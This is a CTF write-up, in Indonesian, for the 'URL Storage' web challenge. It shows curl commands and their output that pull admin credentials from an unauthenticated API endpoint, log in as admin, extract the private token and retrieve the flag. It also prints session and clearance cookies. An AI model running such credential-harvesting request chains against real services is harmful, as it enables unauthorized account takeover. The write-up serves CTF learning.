# URL Storage — Writeup

**Category    :** Web  
**Difficulty  :** Medium  
**Target      :** https://url-storage.sctf.my.id/   
**Description :**

Sebuah papan pengumuman digital. Siapapun boleh menempel. Siapapun boleh melapor.
Dan setiap laporan yang masuk — pasti dibaca oleh sang moderator setia.

Moderator itu menyimpan sebuah kunci rahasia. Ia tidak pernah membagikannya kepada siapapun.
Tapi setiap kali ia membuka laporan, kunci itu ikut terbawa bersamanya.

Bisakah kamu membuat laporan yang bisa berbicara sendiri — tanpa suara, tanpa jejak yang terlihat — dan pulang dengan membawa kuncinya?

Terinspirasi dari sebuah tantangan klasik CTF tahun 2017.

## Solve

Disaat pertama kali membaca source chall ini setelah meng unzip source code dari probset, asumsi nya menggunakan `RPO Chain + CSS exfil + Report Bot` dari `web/app.py`. Kita menemukan jika kalau Admin dibuat di server startup maka akan ada 3 hal vuln yaitu usn admin, pass admin, dan token admin.

```python
admin_username = 'admin'
admin_password = secrets.token_hex(16)
admin_token = secrets.token_hex(16)
```

Admin yang login bisa melihat token pribadinya di dashboardnya di endpoint `/urlstorage`

```html
<p>Welcome! Here is your private token: <code>{{ token }}</code></p>
```

Lalu terdapat endpoint `/flag`

```python
token_input = request.args.get('token', '')
flag_token = token_input[:32]
is_admin = (flag_token == admin_token)
```

Kalau 32 karakter pertama cocok dengan `admin_token`, flag akan tampil. Ternyata terdapat Endpoint `/api/get_reports`

```python
@app.route('/api/get_reports')
def get_reports():
    global reports
    ret = reports.copy()
    reports = []
    return jsonify({'reports': ret, 'admin_username': admin_username, 'admin_password': admin_password})
```

Seperti yang kkita lihat kalau endpoint itu tidak memerlukan `auth`, mengembalikan `admin_username` dan `admin_password`. Karna hal itu kita cukup ambil kredensial admin dari API, login sebagai admin, baca token admin di `/urlstorage`, dan terakhir kirim token nya ke `/flag`.

Lalu karna Live instance berada di belakang Cloudflare challenge. Kita buka target browser, lalu ambil `cookie cf_clearance` dari `DevTools` dan ke `Storage` lalu ke `Cookie`. Setelah cookie valid didapat, request HTTP ke target bisa dilakukan dengan curl.

```
BASE='https://url-storage.sctf.my.id'
CF='cf_clearance=4sBirslbUB8GiIqFnvYNwmeMCYCCJZxFkbvJxviLjQs-1783100869-1.2.1.1-wxGQi7yLgyVBg4kU8XefZzzgghra8euFHEubAlHQBauk2uvk7xZZWogDqca1gWvrySHLReT6ArtzqKb_ixaN6shZmfXXJ_pQQYcaMFBLgcm6pMfVjOPllMa1FfRMk0NmH1GIdgEM.3q3eyGC.x.bAp8g1LX5w7YOzsVRh_5JGmgRiCWXk6EEPxx5cS8szGZbxysLXof8.Y0bLVdmwssjpzJRKCYZ22cHgvJCwNOhdx4jWR3VYT4Yn.GermsIKsPy3hxPhk5Z.oX0SawvaYjSR4AUFpoTOvdGnqv6VfLFu1Y_i_CN0d9ieDy2hpV9e4ZxjEIitUT2HGCCr4jvTZhfJQePKvkWhWZGN5Pszfmos2XrcvxN24bElF7S0gXYVkT5WbScEK5oOxQYz.KS4VMW7atn4qG6wqHP5hQmcnGQ635ICxyd6CkVQL967oQbNZWL'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
```

Setelah itu kita download html nya
```
curl -sk "$BASE/" \
  -H "Cookie: $CF" \
  -H "User-Agent: $UA" \
  -D headers.txt \
  -o index.html
```

Setelah file sudah didapatkan, maka kita coba lihat isinya

```
head index.html
```

output
```
<!DOCTYPE html>
<html>
<head>
    <title>SCTF26 - Login</title>

    <style>
        :root {
            --bg-color: #0f172a;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
```

Kita coba mengambil kredensial admin via API

```
curl -sk "$BASE/api/get_reports" \
  -H "Cookie: $CF" \
  -H "User-Agent: $UA" \
  | jq
```

output
```
{
  "admin_password": "ac745dbcdee1c7ed7e980662f748e7d2",
  "admin_username": "admin",
  "reports": []
}
```

Kita berhasil mendapatkan Kredensial dari admin nya yaitu `ac745dbcdee1c7ed7e980662f748e7d2`, selanjutnya kita coba login sebagai admin

```
curl -sk "$BASE/login" \
  -H "Cookie: $CF" \
  -H "User-Agent: $UA" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -b cookies.txt \
  --data 'username=admin&password=ac745dbcdee1c7ed7e980662f748e7d2' \
  -i
```

output
```
HTTP/2 302 
date: Fri, 03 Jul 2026 18:07:13 GMT
content-type: text/html; charset=utf-8
server: cloudflare
nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
location: /urlstorage
content-security-policy: frame-ancestors 'none'; form-action 'self'; connect-src 'self'; script-src 'self'; font-src 'self'; style-src 'self';
vary: Cookie
set-cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.akf6UQ.4A4jKV74L4BeX6X3dn9c-jekCgM; HttpOnly; Path=/
x-served-by: url-storage.sctf.my.id
cf-cache-status: DYNAMIC
report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=LdIjmpchGZ3Y8TPNXhvYKJGrtnMMU5aTuM0c%2BJ9SUUos01s0bEr92fZZE7mTTlEXgwbh1D8k%2F2ocIfa%2F7Mhz%2BEepGcmcRZDw4ni7e4tjMMBRL6qLOl3KdbXx7rqbiROg1GJ9%2BmPT6Vj0"}]}
cf-ray: a157d41ceacf62dc-SIN
alt-svc: h3=":443"; ma=86400

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/urlstorage">/urlstorage</a>. If not, click the link.
```

Ternyata berhasil dan kita ter redirect ke `/urlstorage`, sekarang kita coba download `/urlstorage` menggunakan `cookie session` yang sudah disimpan tadi

```
curl -sk "$BASE/urlstorage" \
  -H "Cookie: $CF" \
  -H "User-Agent: $UA" \
  -b cookies.txt \
  -o urlstorage.html
```

Kita coba ambil token adminnya

```
grep -oE '[a-f0-9]{32}' urlstorage.html
```

output
```
c36f65ee2a2c8ecad60dfb3ffb30a7be
```

Karna kita sekarang sudah mendapatkan token admin nya, kita bisa melanjutkan untuk mendapatkan flag nya dengan ke endpoint `/flag`

```
TOKEN='c36f65ee2a2c8ecad60dfb3ffb30a7be'

curl -sk "$BASE/flag?token=$TOKEN" \
  -H "Cookie: $CF" \
  -H "User-Agent: $UA" \
  -b cookies.txt
```

output
```
<!DOCTYPE html>
<html>
<head>
    <title>SCTF26 - Flag</title>

    <style>
        :root {
            --bg-color: #0f172a;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-image: 
                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
        }
        .container, form, .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 2rem;
            margin: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h1, h3 {
            margin-top: 0;
            color: #fff;
        }
        input {
            width: 90%;
            padding: 0.75rem;
            margin-bottom: 1rem;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: #fff;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: var(--accent);
        }
        button {
            width: 100%;
            padding: 0.75rem;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background: var(--accent-hover);
        }
        a {
            color: var(--accent);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        hr {
            border: 0;
            height: 1px;
            background: var(--glass-border);
            margin: 2rem 0;
        }
        code {
            background: rgba(0,0,0,0.3);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            color: #38bdf8;
        }
    </style>
</head>
<body>
    <div class="glass-panel">
    <h1>Flag Status</h1>
    <!-- Vulnerability: XSS in token (limited to 64 chars total input) -->
    <p>Token provided: c36f65ee2a2c8ecad60dfb3ffb30a7be</p>
    <hr>
    
    
    <h3>Welcome Admin!</h3>
    <p>Here is your flag:</p>
    <input type="text" id="flag" value="SCTF26{rp0_cs5_l34ks_4nd_xs5_ch41n}" readonly style="width: 300px;">
    
    </div>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"847f60287faa4b79ae45a577e79c5e9d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>
```

## Flag

```text
SCTF26{rp0_cs5_l34ks_4nd_xs5_ch41n}
```
